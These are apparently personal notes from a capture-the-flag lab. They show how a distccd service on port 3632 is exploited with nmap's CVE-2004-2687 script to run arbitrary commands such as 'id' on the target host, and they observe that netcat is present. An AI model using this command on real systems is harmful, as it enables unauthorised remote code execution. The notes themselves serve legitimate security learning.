**3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

- First i search in  nmap for a distccd script using find command  
![[Pasted image 20231112145721.png]]
i run 
```
sudo  less /usr/share/nmap/scripts/distcc-cve2004-2687.nse
```
![[Pasted image 20231112150001.png]]
```
sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```
![[Pasted image 20231112151043.png]]
![[Pasted image 20231112151110.png]]
 we passed in "id" in the payload it returned the id similarly with the hostname .  so basically , we are executing arbitrary commands on the target through this Nmap Script  
 ![[Pasted image 20231112151903.png]]
 and we do have netcat on the box
 ![[Pasted image 20231112152228.png]]
 

